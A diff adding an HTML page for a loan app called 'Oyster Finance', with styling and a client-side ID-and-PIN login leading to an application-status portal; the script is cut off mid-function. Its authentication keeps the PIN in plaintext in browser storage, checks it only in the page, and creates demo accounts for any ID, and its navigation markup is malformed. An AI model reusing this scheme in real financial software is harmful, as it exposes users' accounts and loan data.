@@ -1,0 +1,1452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Oyster Finance - Profile</title>
+<meta name="theme-color" content="#0066ff">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<link rel="manifest" href="manifest.json">
+<link rel="apple-touch-icon" href="img/logo.png">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+/* Reset and Base Styles */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    -webkit-tap-highlight-color: transparent;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+}
+
+:root {
+    --primary: #0066ff;
+    --primary-dark: #0055cc;
+    --primary-light: #4d94ff;
+    --primary-gradient: linear-gradient(135deg, #0066ff, #5e17eb);
+    --secondary: #e60023;
+    --secondary-dark: #cc0000;
+    --secondary-light: #ff3355;
+    --secondary-gradient: linear-gradient(135deg, #e60023, #ff5c8a);
+    --success: #00cc66;
+    --success-dark: #00aa55;
+    --success-light: #33dd87;
+    --success-gradient: linear-gradient(135deg, #00cc66, #00e673);
+    --warning: #ffcc00;
+    --warning-gradient: linear-gradient(135deg, #ffcc00, #ffaa00);
+    --light: #f8f9fa;
+    --dark: #212529;
+    --gray: #6c757d;
+    --gray-light: #e9ecef;
+    --gray-dark: #343a40;
+    --body-bg: #f5f7fa;
+    --card-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+    --card-shadow-hover: 0 15px 35px rgba(0, 0, 0, 0.1);
+    --bottom-nav-height: 65px;
+    --header-height: 60px;
+    --safe-area-top: env(safe-area-inset-top, 0px);
+    --safe-area-bottom: env(safe-area-inset-bottom, 0px);
+    --safe-area-left: env(safe-area-inset-left, 0px);
+    --safe-area-right: env(safe-area-inset-right, 0px);
+}
+
+html, body {
+    height: 100%;
+    width: 100%;
+    overflow-x: hidden;
+    background-color: var(--body-bg);
+    color: var(--dark);
+    position: fixed;
+    overscroll-behavior: none;
+}
+
+/* App Container */
+.app-container {
+    display: flex;
+    flex-direction: column;
+    height: 100%;
+    width: 100%;
+    overflow: hidden;
+    position: relative;
+}
+
+/* App Header */
+.app-header {
+    height: calc(var(--header-height) + var(--safe-area-top));
+    padding-top: var(--safe-area-top);
+    background: var(--primary-gradient);
+    color: white;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding-left: max(16px, var(--safe-area-left));
+    padding-right: max(16px, var(--safe-area-right));
+    position: relative;
+    z-index: 10;
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+}
+
+.logo-container {
+    display: flex;
+    align-items: center;
+    height: 40px;
+}
+
+.logo-container img {
+    height: 32px;
+    width: auto;
+    margin-right: 10px;
+}
+
+.app-header h1 {
+    font-size: 20px;
+    font-weight: 700;
+    letter-spacing: -0.5px;
+}
+
+.header-icon {
+    width: 40px;
+    height: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 50%;
+    cursor: pointer;
+    transition: all 0.2s;
+    position: relative;
+}
+
+.header-icon:active {
+    background-color: rgba(255, 255, 255, 0.2);
+    transform: scale(0.95);
+}
+
+.header-icon .badge {
+    position: absolute;
+    top: 0;
+    right: 0;
+    width: 18px;
+    height: 18px;
+    background-color: var(--secondary);
+    color: white;
+    border-radius: 50%;
+    font-size: 10px;
+    font-weight: 600;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 2px solid var(--primary);
+    animation: pulse 2s infinite;
+}
+
+/* App Content */
+.app-content {
+    flex: 1;
+    overflow-y: auto;
+    overflow-x: hidden;
+    -webkit-overflow-scrolling: touch;
+    padding-bottom: calc(var(--bottom-nav-height) + var(--safe-area-bottom) + 20px);
+    scroll-behavior: smooth;
+    position: relative;
+}
+
+/* Bottom Navigation */
+.bottom-nav {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    height: calc(var(--bottom-nav-height) + var(--safe-area-bottom));
+    padding-bottom: var(--safe-area-bottom);
+    background-color: white;
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+    box-shadow: 0 -5px 25px rgba(0, 0, 0, 0.05);
+    z-index: 100;
+    border-top-left-radius: 20px;
+    border-top-right-radius: 20px;
+}
+
+.nav-item {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    flex: 1;
+    height: 100%;
+    color: var(--gray);
+    transition: all 0.3s;
+    cursor: pointer;
+    min-width: 60px;
+    max-width: 80px;
+    position: relative;
+}
+
+.nav-item.active {
+    color: var(--primary);
+    transform: translateY(-5px);
+}
+
+.nav-item.active::after {
+    content: '';
+    position: absolute;
+    bottom: 10px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 5px;
+    height: 5px;
+    background-color: var(--primary);
+    border-radius: 50%;
+}
+
+.nav-item i {
+    font-size: 22px;
+    margin-bottom: 6px;
+    transition: transform 0.3s;
+}
+
+.nav-item.active i {
+    transform: scale(1.2);
+}
+
+.nav-item span {
+    font-size: 12px;
+    font-weight: 500;
+    transition: opacity 0.3s;
+}
+
+/* Pages */
+.page {
+    display: none;
+    animation: fadeIn 0.3s ease-in-out;
+    min-height: 100%;
+}
+
+.page.active {
+    display: block;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+/* Hero Section */
+.hero-section {
+    position: relative;
+    padding: 0;
+    overflow: hidden;
+    border-radius: 0 0 30px 30px;
+    margin-bottom: 30px;
+    height: 65vh;
+    max-height: 550px;
+    min-height: 450px;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+}
+
+.hero-bg {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: var(--primary-gradient);
+    z-index: 1;
+}
+
+.hero-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100' height='100' viewBox='0 0 100 100'%3E%3Cpath d='M11 18c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm48 25c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm-43-7c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm63 31c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM34 90c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm56-76c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM12 86c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm28-65c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm23-11c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-6 60c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm29 22c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5z' fill='%23ffffff' fill-opacity='0.1'/%3E%3C/svg%3E"),
+                     radial-gradient(circle at 25% 25%, rgba(94, 23, 235, 0.1) 0%, transparent 50%),
+                     radial-gradient(circle at 75% 75%, rgba(0, 102, 255, 0.1) 0%, transparent 50%);
+    z-index: 2;
+    opacity: 1;
+}
+
+.hero-content {
+    position: relative;
+    z-index: 3;
+    padding: 30px 20px;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    grid-column: 1;
+}
+
+.hero-image-container {
+    position: relative;
+    z-index: 3;
+    height: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    grid-column: 2;
+    padding: 20px;
+}
+
+.hero-title {
+    font-size: 36px;
+    font-weight: 800;
+    color: white;
+    margin-bottom: 15px;
+    line-height: 1.2;
+    letter-spacing: -0.5px;
+    text-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    position: relative;
+}
+
+.hero-title::after {
+    content: '';
+    position: absolute;
+    bottom: -5px;
+    left: 0;
+    width: 60px;
+    height: 4px;
+    background: white;
+    border-radius: 2px;
+}
+
+.hero-subtitle {
+    font-size: 18px;
+    color: rgba(255, 255, 255, 0.9);
+    margin-bottom: 25px;
+    line-height: 1.5;
+    font-weight: 400;
+}
+
+.hero-image {
+    width: 100%;
+    max-width: 300px;
+    z-index: 4;
+    filter: drop-shadow(0 15px 30px rgba(0, 0, 0, 0.25));
+    animation: float 6s ease-in-out infinite;
+    transform-origin: center center;
+}
+
+@keyframes float {
+    0% { transform: translateY(0px) rotate(0deg); }
+    25% { transform: translateY(-10px) rotate(2deg); }
+    50% { transform: translateY(-15px) rotate(0deg); }
+    75% { transform: translateY(-10px) rotate(-2deg); }
+    100% { transform: translateY(0px) rotate(0deg); }
+}
+
+/* Hero Shapes */
+.hero-shapes-container {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 2;
+    overflow: hidden;
+}
+
+.hero-shape {
+    position: absolute;
+    z-index: 2;
+    opacity: 0.5;
+}
+
+.hero-shape-1 {
+    top: 20%;
+    left: 10%;
+    width: 60px;
+    height: 60px;
+    background-color: rgba(255, 255, 255, 0.1);
+    border-radius: 50%;
+    animation: pulse 4s infinite;
+}
+
+.hero-shape-2 {
+    bottom: 20%;
+    left: 5%;
+    width: 40px;
+    height: 40px;
+    background-color: rgba(255, 255, 255, 0.1);
+    border-radius: 10px;
+    transform: rotate(45deg);
+    animation: pulse 5s infinite 1s;
+}
+
+@keyframes pulse {
+    0% { transform: scale(1); opacity: 0.5; }
+    50% { transform: scale(1.2); opacity: 0.8; }
+    100% { transform: scale(1); opacity: 0.5; }
+}
+
+/* Card Styles */
+.card {
+    background-color: white;
+    border-radius: 20px;
+    padding: 25px;
+    margin: 0 20px 20px;
+    box-shadow: var(--card-shadow);
+    transition: all 0.3s;
+    position: relative;
+    overflow: hidden;
+}
+
+.card::before {
+    content: '';
+    position: absolute;
+    top: -10px;
+    right: -10px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background-color: rgba(0, 102, 255, 0.05);
+    z-index: 0;
+}
+
+.card:active {
+    transform: scale(0.98);
+    box-shadow: var(--card-shadow-hover);
+}
+
+.card-title {
+    font-size: 20px;
+    font-weight: 700;
+    margin-bottom: 15px;
+    color: var(--dark);
+    letter-spacing: -0.5px;
+    position: relative;
+}
+
+.card-title.with-line::after {
+    content: '';
+    position: absolute;
+    bottom: -8px;
+    left: 0;
+    width: 40px;
+    height: 3px;
+    background: var(--primary-gradient);
+    border-radius: 3px;
+}
+
+/* Login Form Styles */
+.login-form {
+    background-color: white;
+    border-radius: 20px;
+    padding: 25px;
+    margin: 20px 0;
+    box-shadow: var(--card-shadow);
+}
+
+.login-title {
+    text-align: center;
+    font-size: 20px;
+    font-weight: 700;
+    margin-bottom: 20px;
+    color: var(--primary);
+}
+
+/* Form Styles */
+.form-group {
+    margin-bottom: 20px;
+}
+
+.form-label {
+    display: block;
+    margin-bottom: 10px;
+    font-weight: 600;
+    font-size: 15px;
+    color: var(--gray-dark);
+}
+
+.form-control {
+    width: 100%;
+    padding: 15px 20px;
+    border-radius: 15px;
+    border: 2px solid var(--gray-light);
+    font-size: 16px;
+    transition: all 0.3s;
+    background-color: white;
+    appearance: none;
+    min-height: 50px;
+}
+
+.form-control:focus {
+    outline: none;
+    border-color: var(--primary);
+    box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.1);
+}
+
+/* Button Styles */
+.btn {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    padding: 15px 25px;
+    border-radius: 15px;
+    font-weight: 600;
+    font-size: 16px;
+    border: none;
+    cursor: pointer;
+    transition: all 0.3s;
+    min-height: 50px;
+    min-width: 50px;
+    text-decoration: none;
+    position: relative;
+    overflow: hidden;
+}
+
+.btn::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+    transition: 0.5s;
+}
+
+.btn:active::before {
+    left: 100%;
+}
+
+.btn-primary {
+    background: var(--primary-gradient);
+    color: white;
+    box-shadow: 0 5px 15px rgba(0, 102, 255, 0.3);
+}
+
+.btn-primary:active {
+    background: var(--primary-dark);
+    transform: scale(0.98);
+    box-shadow: 0 2px 8px rgba(0, 102, 255, 0.2);
+}
+
+.btn-block {
+    display: flex;
+    width: 100%;
+}
+
+/* Application Status Styles */
+.application-status {
+    display: flex;
+    align-items: center;
+    margin-bottom: 15px;
+}
+
+.status-indicator {
+    width: 15px;
+    height: 15px;
+    border-radius: 50%;
+    margin-right: 10px;
+}
+
+.status-pending {
+    background-color: var(--warning);
+}
+
+.status-approved {
+    background-color: var(--success);
+}
+
+.status-rejected {
+    background-color: var(--secondary);
+}
+
+.progress-tracker {
+    height: 10px;
+    background-color: var(--gray-light);
+    border-radius: 5px;
+    margin-bottom: 20px;
+    overflow: hidden;
+}
+
+.progress-fill {
+    height: 100%;
+    background-color: var(--primary);
+    width: 0%;
+    transition: width 0.5s ease;
+}
+
+.detail-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 10px 0;
+    border-bottom: 1px solid var(--gray-light);
+}
+
+.detail-row:last-child {
+    border-bottom: none;
+}
+
+/* Contact Item Styles */
+.contact-item {
+    display: flex;
+    align-items: center;
+    margin-bottom: 20px;
+}
+
+.contact-icon {
+    width: 50px;
+    height: 50px;
+    border-radius: 15px;
+    background: var(--primary-gradient);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-right: 20px;
+    flex-shrink: 0;
+    color: white;
+    box-shadow: 0 5px 15px rgba(0, 102, 255, 0.2);
+}
+
+.contact-icon i {
+    font-size: 22px;
+}
+
+.contact-text {
+    font-size: 15px;
+    line-height: 1.5;
+}
+
+.contact-text strong {
+    display: block;
+    font-weight: 700;
+    margin-bottom: 5px;
+    font-size: 16px;
+    letter-spacing: -0.5px;
+}
+
+/* Loader */
+.loader {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background-color: rgba(255, 255, 255, 0.9);
+    z-index: 1000;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+}
+
+.loader.show {
+    display: flex;
+}
+
+.spinner {
+    width: 50px;
+    height: 50px;
+    border: 4px solid rgba(0, 102, 255, 0.1);
+    border-radius: 50%;
+    border-top-color: var(--primary);
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+/* Popup Notification */
+.popup-notification {
+    position: fixed;
+    bottom: calc(var(--bottom-nav-height) + var(--safe-area-bottom) + 20px);
+    left: 20px;
+    right: 20px;
+    background: var(--success-gradient);
+    color: white;
+    padding: 20px;
+    border-radius: 15px;
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+    transform: translateY(150%);
+    transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    z-index: 90;
+    display: flex;
+    align-items: center;
+}
+
+.popup-notification.show {
+    transform: translateY(0);
+}
+
+.popup-icon {
+    margin-right: 15px;
+    font-size: 24px;
+}
+
+.popup-text {
+    flex: 1;
+    font-size: 15px;
+    font-weight: 500;
+}
+
+/* Header Actions */
+.header-actions {
+    display: flex;
+    align-items: center;
+}
+
+.header-nav {
+    display: flex;
+    margin-right: 15px;
+}
+
+.header-nav-link {
+    color: rgba(255, 255, 255, 0.8);
+    padding: 5px 10px;
+    margin: 0 5px;
+    font-size: 14px;
+    font-weight: 600;
+    text-decoration: none;
+    border-radius: 20px;
+    transition: all 0.3s;
+}
+
+.header-nav-link.active, .header-nav-link:hover {
+    color: white;
+    background-color: rgba(255, 255, 255, 0.2);
+}
+
+@media (max-width: 768px) {
+    .header-nav {
+        display: none;
+    }
+}
+
+/* WhatsApp Button */
+#whatsapp-button {
+    position: fixed;
+    bottom: calc(var(--bottom-nav-height) + var(--safe-area-bottom) + 20px);
+    right: 20px;
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background: #25D366; /* WhatsApp brand color */
+    color: white;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+    z-index: 999; /* Very high z-index */
+    cursor: pointer;
+    transition: all 0.3s;
+    animation: pulse 2s infinite;
+    border: none;
+    outline: none;
+}
+
+#whatsapp-button:active {
+    transform: scale(0.95);
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+}
+
+#whatsapp-button i {
+    font-size: 30px;
+}
+
+/* PIN Input Styling */
+#loginPin, #createPin, #confirmPin {
+    letter-spacing: 8px;
+    font-size: 24px;
+    text-align: center;
+    font-weight: bold;
+}
+
+/* Status Badge Styling */
+.status-badge {
+    display: inline-block;
+    padding: 5px 10px;
+    border-radius: 20px;
+    font-size: 12px;
+    font-weight: 600;
+    color: white;
+    margin-left: 10px;
+}
+
+.status-badge.pending {
+    background-color: var(--warning);
+}
+
+.status-badge.approved {
+    background-color: var(--success);
+}
+
+.status-badge.rejected {
+    background-color: var(--secondary);
+}
+
+/* Logout Button */
+.logout-button {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    background: rgba(255, 255, 255, 0.2);
+    color: white;
+    border: none;
+    border-radius: 20px;
+    padding: 5px 15px;
+    font-size: 14px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+}
+
+.logout-button i {
+    margin-right: 5px;
+}
+</style>
+</head>
+<body>
+<div class="app-container">
+    <!-- App Header -->
+    <div class="app-header">
+        <div class="logo-container">
+            <img src="img/logo.png" alt="Oyster Finance">
+        </div>
+        <h1>Oyster Finance</h1>
+        <div class="header-actions">
+            <div class="header-nav">
+                <a href="#" class="header-nav-link">Home</a>
+                <a href="#" class="header-nav-link">Apply</a>
+                <a href="#" class="header-nav-link">About</a>
+            </div>
+            <div class="header-icon">
+                <i class="fas fa-bell"></i>
+                <div class="badge">3</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- App Content -->
+    <div class="app-content">
+        <!-- Account Page -->
+        <div class="page active" id="account">
+            <div class="hero-section">
+                <div class="hero-bg"></div>
+                <div class="hero-overlay"></div>
+                <div class="hero-shapes-container">
+                    <div class="hero-shape hero-shape-1"></div>
+                    <div class="hero-shape hero-shape-2"></div>
+                </div>
+                
+                <div class="hero-content">
+                    <h1 class="hero-title">My Account</h1>
+                    <p class="hero-subtitle">Track your loan applications and manage your account</p>
+                </div>
+                
+                <div class="hero-image-container">
+                    <img src="img/screenshot-2025-03-19-10-04-04-removebg-preview (1).png" alt="My account" class="hero-image" style="object-fit: contain; width: 100%; height: 100%;">
+                </div>
+            </div>
+
+            <!-- Login Form -->
+            <div class="login-form" id="login-section">
+                <h3 class="login-title">Login to Your Account</h3>
+                
+                <!-- Step 1: ID Number Input -->
+                <div id="id-input-step" style="display: block;">
+                    <div class="form-group">
+                        <label class="form-label">ID Number</label>
+                        <input type="text" class="form-control" id="loginId" required>
+                    </div>
+                    <button class="btn btn-primary btn-block" id="checkIdButton">Continue</button>
+                </div>
+                
+                <!-- Step 2: PIN Input (initially hidden) -->
+                <div id="pin-input-step" style="display: none;">
+                    <div class="form-group">
+                        <label class="form-label">Enter PIN</label>
+                        <input type="password" class="form-control" id="loginPin" maxlength="4" required>
+                    </div>
+                    <button class="btn btn-primary btn-block" id="verifyPinButton">Login</button>
+                    <button class="btn btn-outline btn-block" id="backToIdButton" style="margin-top: 10px;">Back</button>
+                </div>
+                
+                <!-- Step 3: Create PIN (initially hidden) -->
+                <div id="create-pin-step" style="display: none;">
+                    <div class="form-group">
+                        <label class="form-label">Create 4-Digit PIN</label>
+                        <input type="password" class="form-control" id="createPin" maxlength="4" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Confirm PIN</label>
+                        <input type="password" class="form-control" id="confirmPin" maxlength="4" required>
+                    </div>
+                    <button class="btn btn-primary btn-block" id="savePinButton">Create PIN & Login</button>
+                    <button class="btn btn-outline btn-block" id="backToIdFromCreateButton" style="margin-top: 10px;">Back</button>
+                </div>
+            </div>
+
+            <!-- Application Tracking Portal (initially hidden) -->
+            <div id="portal-section" style="display: none;">
+                <button class="logout-button" id="logoutButton">
+                    <i class="fas fa-sign-out-alt"></i> Logout
+                </button>
+                <div class="card">
+                    <div class="card-title with-line">Application Status</div>
+                    <div class="application-status">
+                        <div class="status-indicator status-pending" id="statusIndicator"></div>
+                        <span id="statusText">Application Pending Review</span>
+                    </div>
+                    <p>Application submitted on: <span id="applicationDate">-</span></p>
+                    <div class="progress-tracker">
+                        <div class="progress-fill" id="applicationProgress" style="width: 30%;"></div>
+                    </div>
+                    <p style="text-align: center; font-size: 0.9rem;">Application is <span id="progressPercentage">30%</span> complete</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-title with-line">Application Details</div>
+                    <div class="detail-row">
+                        <span>Full Name:</span>
+                        <span id="detailName">-</span>
+                    </div>
+                    <div class="detail-row">
+                        <span>ID Number:</span>
+                        <span id="detailId">-</span>
+                    </div>
+                    <div class="detail-row">
+                        <span>Contact Number:</span>
+                        <span id="detailPhone">-</span>
+                    </div>
+                    <div class="detail-row">
+                        <span>Email:</span>
+                        <span id="detailEmail">-</span>
+                    </div>
+                    <div class="detail-row">
+                        <span>Loan Amount:</span>
+                        <span id="detailAmount">-</span>
+                    </div>
+                    <div class="detail-row">
+                        <span>Loan Term:</span>
+                        <span id="detailTerm">-</span>
+                    </div>
+                    <div class="detail-row">
+                        <span>Loan Purpose:</span>
+                        <span id="detailPurpose">-</span>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title with-line">Next Steps</div>
+                    <p>Our team is currently reviewing your application. You will receive an SMS and email notification once a decision has been made.</p>
+                    <p style="margin-top: 15px;">For any queries, please contact us at:</p>
+                    <div class="contact-item">
+                        <div class="contact-icon">
+                            <i class="fas fa-phone-alt"></i>
+                        </div>
+                        <div class="contact-text">
+                            <strong>Phone</strong>
+                            +27698480097
+                        </div>
+                    </div>
+                    <div class="contact-item">
+                        <div class="contact-icon">
+                            <i class="fab fa-whatsapp"></i>
+                        </div>
+                        <div class="contact-text">
+                            <strong>WhatsApp</strong>
+                            +27698480097
+                        </div>
+                    </div>
+                    <div class="contact-item">
+                        <div class="contact-icon">
+                            <i class="fas fa-envelope"></i>
+                        </div>
+                        <div class="contact-text">
+                            <strong>Email</strong>
+                            oysterfinanceltd@gmail.com
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+     <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+        <div class="bottom-nav">
+    <a href="index.html" class="nav-item active" data-page="home">
+        <i class="fas fa-home"></i>
+        <span>Home</span>
+        
+        <a href="profile.html" class="nav-item" data-page="account">
+    <i class="fas fa-user"></i>
+    <span>Account</span>
+</a>
+       
+    </div>
+
+    <!-- WhatsApp Button -->
+    <button id="whatsapp-button">
+        <i class="fab fa-whatsapp"></i>
+    </button>
+
+    <!-- Popup Notification -->
+    <div class="popup-notification" id="popupNotification">
+        <div class="popup-icon">
+            <i class="fas fa-check-circle"></i>
+        </div>
+        <div class="popup-text" id="popupText"></div>
+    </div>
+
+    <!-- Loader -->
+    <div class="loader" id="loader">
+        <div class="spinner"></div>
+        <p>Processing your request...</p>
+    </div>
+</div>
+
+<!-- JavaScript -->
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Navigation
+    const navItems = document.querySelectorAll('.nav-item');
+    
+    navItems.forEach(item => {
+        item.addEventListener('click', function() {
+            // For demo purposes, just show a notification
+            const pageId = this.getAttribute('data-page');
+            if (pageId !== 'account') {
+                const popup = document.getElementById('popupNotification');
+                document.getElementById('popupText').textContent = '.';
+                popup.classList.add('show');
+                
+                setTimeout(function() {
+                    popup.classList.remove('show');
+                }, 3000);
+            }
+        });
+    });
+    
+    // WhatsApp Button
+    document.getElementById('whatsapp-button').addEventListener('click', function() {
+        window.open('https://wa.me/+27698480097', '_blank');
+    });
+    
+    // Login System
+    const idInputStep = document.getElementById('id-input-step');
+    const pinInputStep = document.getElementById('pin-input-step');
+    const createPinStep = document.getElementById('create-pin-step');
+    const loginId = document.getElementById('loginId');
+    const loginPin = document.getElementById('loginPin');
+    const createPin = document.getElementById('createPin');
+    const confirmPin = document.getElementById('confirmPin');
+    
+    // Check ID Button
+    document.getElementById('checkIdButton').addEventListener('click', function() {
+        const idNumber = loginId.value.trim();
+        
+        if (!idNumber) {
+            showNotification('Please enter your ID number.', 'error');
+            return;
+        }
+        
+        // Show loader
+        document.getElementById('loader').classList.add('show');
+        
+        setTimeout(function() {
+            document.getElementById('loader').classList.remove('show');
+            
+            // Check if user exists in localStorage
+            const userDataString = localStorage.getItem('userData_' + idNumber);
+            
+            if (userDataString) {
+                try {
+                    const userData = JSON.parse(userDataString);
+                    
+                    // Check if data is expired (30 days)
+                    const now = new Date().getTime();
+                    const storedTime = userData.lastLogin || 0;
+                    const thirtyDaysInMs = 30 * 24 * 60 * 60 * 1000;
+                    
+                    if (now - storedTime > thirtyDaysInMs) {
+                        // Data expired, ask to create new PIN
+                        idInputStep.style.display = 'none';
+                        createPinStep.style.display = 'block';
+                        showNotification('Your session has expired. Please create a new PIN.', 'info');
+                    } else if (userData.pin) {
+                        // User exists and has PIN, ask for PIN
+                        idInputStep.style.display = 'none';
+                        pinInputStep.style.display = 'block';
+                        showNotification('Please enter your PIN.', 'info');
+                    } else {
+                        // User exists but no PIN, ask to create PIN
+                        idInputStep.style.display = 'none';
+                        createPinStep.style.display = 'block';
+                        showNotification('Please create a PIN for your account.', 'info');
+                    }
+                } catch (error) {
+                    console.error("Error parsing user data:", error);
+                    showNotification('An error occurred. Please try again.', 'error');
+                }
+            } else {
+                // Check if there's an application with this ID
+                const savedApplication = localStorage.getItem('loanApplication');
+                
+                if (savedApplication) {
+                    try {
+                        const applicationData = JSON.parse(savedApplication);
+                        
+                        if (applicationData.idNumber === idNumber) {
+                            // Application exists but no user account, ask to create PIN
+                            idInputStep.style.display = 'none';
+                            createPinStep.style.display = 'block';
+                            showNotification('Please create a PIN for your account.', 'info');
+                        } else {
+                            showNotification('No account found with this ID number.', 'error');
+                        }
+                    } catch (error) {
+                        console.error("Error parsing application data:", error);
+                        showNotification('An error occurred. Please try again.', 'error');
+                    }
+                } else {
+                    // No user or application found, create demo data
+                    createDemoData(idNumber);
+                    idInputStep.style.display = 'none';
+                    createPinStep.style.display = 'block';
+                    showNotification('Welcome! Please create a PIN for your account.', 'info');
+                }
+            }
+        }, 1000);
+    });
+    
+    // Back to ID Button
+    document.getElementById('backToIdButton').addEventListener('click', function() {
+        pinInputStep.style.display = 'none';
+        idInputStep.style.display = 'block';
+    });
+    
+    // Back to ID from Create PIN Button
+    document.getElementById('backToIdFromCreateButton').addEventListener('click', function() {
+        createPinStep.style.display = 'none';
+        idInputStep.style.display = 'block';
+    });
+    
+    // Verify PIN Button
+    document.getElementById('verifyPinButton').addEventListener('click', function() {
+        const idNumber = loginId.value.trim();
+        const pin = loginPin.value.trim();
+        
+        if (!pin) {
+            showNotification('Please enter your PIN.', 'error');
+            return;
+        }
+        
+        // Show loader
+        document.getElementById('loader').classList.add('show');
+        
+        setTimeout(function() {
+            document.getElementById('loader').classList.remove('show');
+            
+            const userDataString = localStorage.getItem('userData_' + idNumber);
+            
+            if (userDataString) {
+                try {
+                    const userData = JSON.parse(userDataString);
+                    
+                    if (userData.pin === pin) {
+                        // PIN matches, update last login time
+                        userData.lastLogin = new Date().getTime();
+                        localStorage.setItem('userData_' + idNumber, JSON.stringify(userData));
+                        
+                        // Login successful
+                        completeLogin(idNumber);
+                    } else {
+                        showNotification('Incorrect PIN. Please try again.', 'error');
+                    }
+                } catch (error) {
+                    console.error("Error verifying PIN:", error);
+                    showNotification('An error occurred. Please try again.', 'error');
+                }
+            } else {
+                showNotification('Session expired. Please start again.', 'error');
+                pinInputStep.style.display = 'none';
+                idInputStep.style.display = 'block';
+            }
+        }, 1000);
+    });
+    
+    // Save PIN Button
+    document.getElementById('savePinButton').addEventListener('click', function() {
+        const idNumber = loginId.value.trim();
+        const pin = createPin.value.trim();
+        const confirmPinValue = confirmPin.value.trim();
+        
+        if (!pin || !confirmPinValue) {
+            showNotification('Please enter and confirm your PIN.', 'error');
+            return;
+        }
+        
+        if (pin !== confirmPinValue) {
+            showNotification('PINs do not match. Please try again.', 'error');
+            return;
+        }
+        
+        if (pin.length !== 4 || !/^\d+$/.test(pin)) {
+            showNotification('PIN must be 4 digits.', 'error');
+            return;
+        }
+        
+        // Show loader
+        document.getElementById('loader').classList.add('show');
+        
+        setTimeout(function() {
+            document.getElementById('loader').classList.remove('show');
+            
+            // Create or update user data
+            const userData = {
+                idNumber: idNumber,
+                pin: pin,
+                lastLogin: new Date().getTime()
+            };
+            
+            localStorage.setItem('userData_' + idNumber, JSON.stringify(userData));
+            
+            // Login successful
+            completeLogin(idNumber);
+        }, 1000);
+    });
+    
+    // Function to complete login and show application details
+    function completeLogin(idNumber) {
+        // Hide login form and show portal
+        document.getElementById('login-section').style.display = 'none';
+        document.getElementById('portal-section').style.display = 'block';
+        
+        // Get application data
